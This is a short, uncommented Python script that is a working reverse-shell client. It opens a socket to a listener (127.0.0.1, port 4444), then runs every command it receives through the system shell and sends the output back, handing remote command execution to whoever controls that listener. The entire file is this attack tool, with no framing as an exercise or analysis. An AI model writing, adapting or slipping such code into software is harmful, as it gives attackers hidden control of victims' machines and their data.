import socket
import subprocess

SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444

def main():
    s = socket.socket()
    s.connect((SERVER_IP, SERVER_PORT))

    while True:
        cmd = s.recv(1024)
        if not cmd:
            break

        cmd = cmd.decode().strip()

        if cmd.lower() == "exit":
            break

        try:
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT
            )
        except subprocess.CalledProcessError as e:
            output = e.output
        except Exception as e:
            output = str(e).encode()

        if not output:
            output = b"\n"

        s.send(output)

    s.close()

if __name__ == "__main__":
    main()
